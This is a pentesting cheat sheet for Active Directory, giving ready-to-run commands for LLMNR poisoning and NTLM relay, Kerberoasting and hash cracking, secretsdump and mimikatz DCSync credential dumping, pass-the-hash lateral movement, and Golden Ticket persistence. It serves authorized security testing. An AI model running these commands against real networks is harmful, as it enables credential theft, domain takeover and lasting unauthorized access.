# Active Directory Pentesting Methodology

## Initial Enumeration (No Creds / Low-Priv)
```bash
# Null session / anonymous checks (rare on modern DCs, still worth trying)
crackmapexec smb <dc-ip> -u '' -p ''
# LDAP anonymous bind
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=local"
```

## With Valid Low-Privilege Creds
```bash
crackmapexec smb <dc-ip> -u user -p pass --users
crackmapexec smb <dc-ip> -u user -p pass --groups
bloodhound-python -u user -p pass -d domain.local -ns <dc-ip> -c All
```
Feed BloodHound's output into the GUI — it's the fastest way to visually spot attack paths (e.g., a low-priv user with `GenericAll` on a group that's nested into Domain Admins).

## Key Attack Paths to Check
| Technique | What it needs | What it gets you |
|---|---|---|
| Kerberoasting | Any domain account | Crackable service account password hashes |
| AS-REP Roasting | Accounts with "Do not require Kerberos preauth" set | Crackable hash without needing a password first |
| ACL abuse (GenericAll/WriteDACL/etc.) | Any account with a misconfigured ACE | Ability to reset passwords, add to groups, or take over objects |
| Unconstrained delegation | A compromised host with unconstrained delegation | Capture a DC's TGT when it authenticates to that host |
| GPO abuse | Write access to a GPO | Push a malicious scheduled task/script to every machine that GPO applies to |
| LLMNR/NBT-NS poisoning | Network position (any authenticated host) | Capture NetNTLM hashes for offline cracking or relay |

## LLMNR/NBT-NS Poisoning + Relay
```bash
responder -I eth0 -wrf
# If SMB signing is disabled on targets, relay instead of just capturing:
ntlmrelayx.py -tf targets.txt -smb2support
```

## Kerberoasting
```bash
GetUserSPNs.py domain.local/user:pass -dc-ip <dc-ip> -request
hashcat -m 13100 hashes.txt rockyou.txt
```

## Dumping Credentials Post-Compromise
```bash
secretsdump.py domain.local/admin:pass@<dc-ip>              # remote SAM/NTDS dump if DA
mimikatz # lsadump::dcsync /user:domain\krbtgt                # DCSync if you have replication rights
```

## Lateral Movement
```bash
crackmapexec smb <target> -u admin -H <ntlm-hash>            # pass-the-hash
wmiexec.py domain.local/admin@<target> -hashes :<ntlm-hash>
evil-winrm -i <target> -u admin -H <ntlm-hash>
```

## Persistence (only within authorized scope)
- Golden Ticket (forge TGTs using the `krbtgt` hash — survives password changes on individual accounts).
- Silver Ticket (forge a TGS for a specific service using that service account's hash — quieter, doesn't touch the DC).
- DCSync rights granted to a compromised low-priv account (subtle, blends into normal replication traffic).

## Practical Order of Operations
1. Enumerate with BloodHound as early as possible — it directs everything after.
2. Try Kerberoasting/AS-REP roasting immediately — free, no elevated access needed.
3. Check for LLMNR/NBT-NS poisoning opportunities in parallel.
4. Follow whatever BloodHound attack path is shortest to Domain Admin.
5. Once DA, DCSync for full credential dump, then assess actual business impact — not just "I got DA."